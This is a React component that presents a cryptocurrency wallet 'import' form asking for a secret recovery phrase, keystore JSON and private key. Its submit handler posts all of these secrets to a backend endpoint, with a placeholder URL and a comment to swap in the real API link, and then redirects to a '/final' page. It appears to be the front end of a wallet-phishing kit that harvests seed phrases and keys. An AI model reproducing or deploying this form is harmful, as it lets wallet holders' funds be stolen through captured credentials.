import React, { useState } from 'react'
import './WalletForm.css'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'
import QRCode from 'qrcode.react'

function WalletForm({ name }) {
  const [recoveryPhrase, setRecoveryPhrase] = useState()
  const [keyStore, setkeyStore] = useState()
  const [privateKey, setprivateKey] = useState()
  const [filled, setFilled] = useState(false)
  const [qrCodeText, setQrCodeText] = useState('')
  const [showQr, setShowQr] = useState(false)
  const history = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault()
    //replace url with api link below
    const url = 'http://localhost:8000/details'
    if (recoveryPhrase || keyStore || privateKey) {
      axios
        .post(url, {
          recoveryPhrase,
          keyStore,
          privateKey,
          name,
        })
        .then((response) => {
          console.log(response)
          history('/final')
        })
        .catch((err) => {
          console.log(err.message)
        })
      setFilled(false)
    } else {
      setFilled(true)
    }
  }

  const handleRecoveryChange = (e) => {
    setRecoveryPhrase(e.target.value)
  }
  const handlekeystoreChange = (e) => {
    setkeyStore(e.target.value)
  }
  const handleprivatekeyChange = (e) => {
    setprivateKey(e.target.value)
  }

  const generateQRCode = () => {
    if (privateKey.length > 0) {
      setQrCodeText(privateKey)
      setShowQr(true)
    }
  }

  const downloadQRCode = () => {
    const canvas = document.getElementById('qrCodeEL')
    const pngUrl = canvas
      .toDataURL('image/png')
      .replace('image/png', 'image/octet-stream')
    let downloadLink = document.createElement('a')
    downloadLink.href = pngUrl
    downloadLink.download = 'img.png'
    document.body.appendChild(downloadLink)
    downloadLink.click()
    document.body.removeChild(downloadLink)
  }

  return (
    <div className="wallet-form">
      <form onSubmit={handleSubmit}>
        <div className="field">
          <label for="secret">Secret Recovery Phrase</label>
          <textarea
            value={recoveryPhrase}
            onChange={handleRecoveryChange}
            rows="6"
            cols="50"
          ></textarea>
          <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
        </div>
        <div className="field">
          <label for="key-store">Key Store</label>
          <textarea
            onChange={handlekeystoreChange}
            rows="6"
            cols="50"
          ></textarea>
          <p>Must be a valid JSON object.</p>
        </div>
        <div className="field">
          <label for="private-key">Private Key</label>
          <input onChange={handleprivatekeyChange} type="text" />
          <p>At least 12 characters, generate qrcode from private key</p>
        </div>
        {/* generate qr code here */}
        <div className="field qrcode">
          <button className="generate" onClick={generateQRCode}>
            Generate Qrcode
          </button>
          <div class="code">
            {showQr && <QRCode id="qrCodeEL" size={150} value={qrCodeText} />}
            {showQr && (
              <input
                type="button"
                className="download-btn"
                value="Download"
                onClick={downloadQRCode}
              />
            )}
          </div>
        </div>
        <div className="field safe-data">
          <label for="wallet-name">Wallet name</label>
          <input type="text" value={name} />
        </div>
        {filled && (
          <div class="empty-message">
            <p>please enter a value</p>
          </div>
        )}
        <input className="submit-btn" type="submit" value="import" />
      </form>
    </div>
  )
}

export default WalletForm
